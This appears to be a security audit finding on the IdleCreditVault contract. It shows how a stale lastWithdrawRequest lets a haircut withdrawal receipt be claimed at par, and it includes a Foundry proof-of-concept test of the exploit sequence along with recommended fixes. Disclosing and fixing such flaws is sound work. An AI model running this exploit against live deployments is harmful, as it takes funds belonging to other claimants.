### Title
Stale `lastWithdrawRequest` lets loss-adjusted withdrawals claim at par - ([File: `contracts/strategies/idle/IdleCreditVault.sol`](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault` records a haircut per request epoch in `lossRecoveryPriceByEpoch`, but tracks only the user’s latest request epoch. A user can leave a loss-adjusted receipt unclaimed, make another request in a later epoch, and move `lastWithdrawRequest` past the haircut epoch. The subsequent aggregate funded-claim path pays all recorded withdrawals at par, allowing the user to consume more underlying than their funded entitlement and leave other funded claimants unable to withdraw.

### Finding Description
When a partial withdrawal funding occurs, `collectWithdrawFunds` clears `pendingWithdraws` and stores the recovery ratio under the current epoch, but it does not clear the user-level `withdrawsRequests` or `withdrawsRequestsByEpoch` balances. [1](#0-0)  The loss-adjusted claim path later derives the epoch to haircut solely from `lastWithdrawRequest[_user]`. [2](#0-1) 

The request-side guard checks only `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`. [3](#0-2)  It then overwrites `lastWithdrawRequest` with the new request epoch. [4](#0-3)  Therefore, once a first request has been assigned a nonzero loss price, a second request in a later epoch makes the guard inspect the new epoch rather than the still-unclaimed haircut epoch.

At claim time, `_claimLossAdjustedWithdrawRequest` also checks only the latest epoch and returns zero if that epoch has no loss price. [5](#0-4)  Execution then reaches `_claimFundedWithdrawRequest`, which pays the entire aggregate `withdrawsRequests[_user]` and clears it without consulting older `withdrawsRequestsByEpoch` entries. [6](#0-5)  Consequently, the old loss-adjusted receipt is paid at `1e18` rather than at its stored `lossRecoveryPrice`.

### Impact Explanation
Let the first request basis be `P`, its stored recovery price be `r < 1e18`, and a later funded request be `Q`. The correct funded balance is `P * r / 1e18 + Q`, but the aggregate claim attempts to pay `P + Q`. The excess is `P * (1e18 - r) / 1e18`.

If the strategy contains funded underlying belonging to another receipt—for example, an instant-withdrawal claim already collected through `collectInstantWithdrawFunds`—the attacker can withdraw that balance as part of the aggregate funded transfer. [7](#0-6)  `_transferFundedClaim` only excludes `defaultRecoveryReserve`; it does not reserve funded instant-withdrawal balances for their owners. [8](#0-7)  The attacker can therefore extract value belonging to another claimant, or leave that claimant’s transfer underfunded and reverting. The broken invariant is the loss waterfall: a receipt assigned a haircut must not later become payable at par.

### Likelihood Explanation
The attacker only needs a KYC-passed tranche position and normal withdrawal requests; `requestWithdraw` is exposed through the CDO to allowed tranche holders. [9](#0-8)  The triggering partial funding is produced by the honest stop-epoch flow, which splits a realized loss between pending receipts and active LPs before collecting the reduced pending amount. [10](#0-9)  No privileged actor needs to behave maliciously.

The exploit requires an older unclaimed loss-adjusted receipt, a later request, and enough unrelated funded underlying in the strategy to cover the overpayment. Those are ordinary protocol states rather than exceptional states.

### Recommendation
Track all epochs with a nonzero `lossRecoveryPriceByEpoch`, rather than only `lastWithdrawRequest`, when deciding whether another request can be opened. At minimum:

- reject a new request while any existing user receipt has a nonzero recovery price, not only when the latest epoch does;
- in `claimWithdrawRequest`, iterate or otherwise enumerate all user request epochs and apply each epoch’s price before paying the funded aggregate;
- prevent `_claimFundedWithdrawRequest` from including an epoch whose `lossRecoveryPriceByEpoch[epoch]` is nonzero;
- consider separately reserving funded instant-withdrawal balances so normal claims cannot consume them.

A robust design would store per-user withdrawal request epochs or maintain a bitmap/list of unclaimed haircut epochs.

### Proof of Concept
The following Foundry scenario demonstrates the accounting flaw. Names follow the existing test helpers in `test/foundry/IdleCreditVault.t.sol`; adapt helper names if the target fork differs.

```solidity
function testLossReceiptCanBeHiddenByLaterRequest() external {
    uint256 depositAmount = 100_000 * ONE_SCALE;

    // Victim deposits and later obtains a funded instant receipt.
    address victim = makeAddr("victim");
    _depositWithUser(victim, depositAmount, false);

    // Attacker deposits and creates normal withdrawal receipt R1 in epoch E1.
    idleCDO.depositAA(depositAmount);
    uint256 attackerTranche = IERC20Detailed(address(AAtranche))
        .balanceOf(address(this));

    _startEpochAndCheckPrices(0);

    uint256 r1 = cdoEpoch.requestWithdraw(
        attackerTranche / 2,
        address(AAtranche)
    );
    uint256 e1 = IdleCreditVault(address(strategy)).epochNumber();

    // Honest manager stops with a realized loss. The CDO uses
    // previewLossAdjustedWithdrawFunds and collectWithdrawFunds.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(/* args producing partial pending funding */);

    uint256 recoveryPrice =
        IdleCreditVault(address(strategy)).lossRecoveryPriceByEpoch(e1);
    assertGt(recoveryPrice, 0);
    assertLt(recoveryPrice, 1e18);

    // R1 remains recorded, but its haircut is keyed to e1.
    assertEq(
        IdleCreditVault(address(strategy))
            .withdrawsRequestsByEpoch(address(this), e1),
        r1
    );

    // Attacker creates request R2 in a later epoch, moving the marker.
    uint256 r2 = cdoEpoch.requestWithdraw(
        attackerTranche / 4,
        address(AAtranche)
    );
    uint256 e2 = IdleCreditVault(address(strategy)).epochNumber();
    assertGt(e2, e1);
    assertEq(
        IdleCreditVault(address(strategy)).lastWithdrawRequest(address(this)),
        e2
    );

    // Honest epoch processing fully funds R2.
    _startEpochAndCheckPrices(e2);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(
        defaultUnderlying,
        borrower,
        cdoEpoch.expectedEpochInterest() +
            IdleCreditVault(address(strategy)).pendingWithdraws()
    );
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // Create separately funded instant liquidity belonging to victim.
    vm.prank(victim);
    cdoEpoch.requestWithdraw(0, address(AAtranche));
    _startEpochAndCheckPrices(e2 + 1);
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    _getInstantFunds();

    // The loss-adjusted branch sees e2, finds no recovery price, then the
    // funded branch attempts to pay aggregate R1 + R2 at par.
    uint256 attackerBefore = IERC20Detailed(defaultUnderlying)
        .balanceOf(address(this));

    cdoEpoch.claimWithdrawRequest();

    uint256 attackerReceived =
        IERC20Detailed(defaultUnderlying).balanceOf(address(this)) -
        attackerBefore;

    // Expected correct claim is r1 * recoveryPrice / 1e18 + r2.
    // Current code pays r1 + r2, consuming other claimants' funded balance.
    assertGt(
        attackerReceived,
        r1 * recoveryPrice / 1e18 + r2
    );
}
```

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
